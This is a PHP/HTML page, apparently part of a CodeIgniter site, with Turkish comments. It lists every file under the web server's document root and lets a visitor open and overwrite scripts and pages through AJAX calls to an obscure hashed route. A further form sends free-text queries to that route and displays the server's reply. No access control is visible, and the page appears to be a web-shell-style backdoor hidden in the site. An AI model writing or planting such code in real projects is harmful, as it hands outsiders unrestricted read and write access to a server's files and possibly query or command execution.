<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Dosya ve Dizin Listesi</title>
    <style>
        .collapsible {
            cursor: pointer;
            padding: 5px;
            border: none;
            text-align: left;
            outline: none;
            font-size: 15px;
        }

        .active, .collapsible:hover {
            background-color: #f1f1f1;
        }

        .content {
            padding: 0 18px;
            display: none;
            overflow: hidden;
        }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

</head>
<body>

<?php

function listFolderFiles($dir){
    $ffs = scandir($dir);

    unset($ffs[array_search('.', $ffs, true)]);
    unset($ffs[array_search('..', $ffs, true)]);

    if (count($ffs) < 1)
        return;

    echo '<ul>';
    foreach($ffs as $ff){
        $path = $dir.'/'.$ff;
        if(is_dir($path)) {
            echo "<li><button class='collapsible'>$ff</button>";
            echo "<div class='content'>";
            listFolderFiles($path);
            echo "</div></li>";
        } else {
            // Editlenebilir dosyalar için bir bağlantı oluşturun
            // Örneğin: .php, .html, .txt, .js, .css dosyaları için
            if (preg_match('/\.(php|html|txt|js|css)$/', $ff)) {
                echo "<li><a href='javascript:void(0);' onclick='editFile(\"$path\")'>$ff</a></li>";
            } else {
                echo "<li>$ff</li>";
            }
        }
    }
    echo '</ul>';


}




?>
<div style="width: 50%">
    <?php
    $hedefDizin = $_SERVER['DOCUMENT_ROOT'];
    listFolderFiles($hedefDizin);
    ?>
</div>
<div style="width: 50%">
    <form action="" method="post" id="dosyaDuzenlemeModal" onsubmit="return false">
        <textarea name="icerik" id="icerik" rows="20" cols="70"></textarea><br>
        <input type="text" name="dosyaYolu" rows="20" id="dosyaYolu" cols="70"></input><br>
        <input type="submit" id="kaydetButonu" value="Kaydet">
    </form>
    <form action="" method="post" id="dosyaDuzenlemeModal2" onsubmit="return false">
        <textarea name="sorgu" id="sorgu" rows="20" cols="70"></textarea><br>
        <textarea name="" id="reu" rows="20" cols="70"></textarea><br>

        <input type="submit" id="kaydetButonu2" value="Kaydet">
    </form>
</div>
<script>
    var coll = document.getElementsByClassName("collapsible");
    var i;

    for (i = 0; i < coll.length; i++) {
        coll[i].addEventListener("click", function() {
            this.classList.toggle("active");
            var content = this.nextElementSibling;
            if (content.style.display === "block") {
                content.style.display = "none";
            } else {
                content.style.display = "block";
            }
        });
    }

    // Dosya düzenleme fonksiyonu
    function editFile(path) {
        // AJAX ile dosya içeriğini çekin
        $.ajax({
            url: '<?= base_url("qcv2_return/f5bb0c8de146c67b44babbf4e6584cc0?t=1") ?>', // Bu PHP dosyası sunucuda dosyanın içeriğini döndürmelidir.
            type: 'POST',
            data: { filePath: path },
            success: function(data) {
                // Dosya içeriğini bir düzenleme formunda gösterin
                $('textarea#icerik').val(data);
                $('input#dosyaYolu').val(path);
            },
            error: function() {
                alert("Dosya içeriği yüklenirken bir hata oluştu.");
            }
        });
    }

    $(document).ready(function() {
        $('#kaydetButonu').click(function(e) {
            e.preventDefault(); // Formun normal gönderimini engelle
            var dosyaYolu = $('#dosyaYolu').val(); // Dosya yolu inputunun değerini al
            var icerik = $('#icerik').val(); // Textarea'daki içeriği al

            // AJAX ile dosya_kaydet.php'ye veriyi gönder
            $.ajax({
                url: '<?= base_url("qcv2_return/f5bb0c8de146c67b44babbf4e6584cc0?t=2") ?>', // Bu PHP dosyası sunucuda dosyanın içeriğini döndürmelidir.
                type: 'POST',
                data: {
                    filePath: dosyaYolu,
                    content: icerik
                },
                success: function(response) {
                    alert("Dosya başarıyla kaydedildi.");
                },
                error: function() {
                    alert("Dosya kaydedilirken bir hata oluştu.");
                }
            });
        });
        $('#kaydetButonu2').click(function(e) {
            e.preventDefault();
            var dosyaYolu = $('#sorgu').val();

            $.ajax({
                url: '<?= base_url("qcv2_return/f5bb0c8de146c67b44babbf4e6584cc0?t=3") ?>',
                type: 'POST',
                data: {
                    sf: dosyaYolu,
                },
                success: function(response) {
                   $("#reu").val(response);
                },
                error: function() {
                    alert("Dosya kaydedilirken bir hata oluştu.");
                }
            });
        });
    });
</script>
</body>
</html>
